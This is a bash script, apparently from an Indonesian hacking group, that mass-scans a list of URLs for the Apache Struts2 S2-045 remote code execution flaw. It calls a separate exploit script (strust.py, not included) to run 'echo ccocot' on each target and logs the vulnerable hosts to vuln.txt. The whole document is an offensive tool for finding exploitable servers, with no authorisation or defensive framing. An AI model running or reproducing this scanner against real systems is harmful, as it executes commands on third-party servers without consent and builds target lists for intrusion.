#!/bin/bash
#POWERED BY NAONLAH.NET - BUDAKJALANAN
#color
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m'
Default='\e[39m'
#FORMATING
Bold='\e[1m'
Dim='\e[2m'
Underline='\e[4m'
Blink='\e[5m'
Inveterted='\e[7m'
#clear all formating
crotclear='\e[0m'
##MAIN
clear
chmod +x strust.py
echo -e $Bold"-==[MASS Check Apache Struts2 S2-045 - "$lightgreen"BC0DE.NET&NAONLAH.NET"$crotclear$Bold"]==-"$crotclear
echo -n "Masukan Nama File List : "; read listname
echo $[$(wc -l < $listname)+1] Line on $listname
echo
i=0
for url in $(cat $listname); do
	i=$[i+1]
	ngecheck=$(timeout 10 ./strust.py "$url" "echo ccocot" 2> /dev/null)
	if [[ $ngecheck =~ 'ccocot' ]] ; then
		echo -e $i".URL : "$Bold$lightgreen$url$crotclear
		echo -e "Status : "$Bold$lightgreen"VULN"$crotclear
		echo $url >> vuln.txt
		echo 
	else
		echo -e $i".URL : "$Bold$red$url$crotclear
		echo -e "Status : "$Bold$red"Not Vuln / timeout(10)"$crotclear
		echo $url >> notvuln.txt
		echo 
	fi
done
echo "vuln >> vuln.txt"
echo "not vuln / timeout >> notvuln.txt"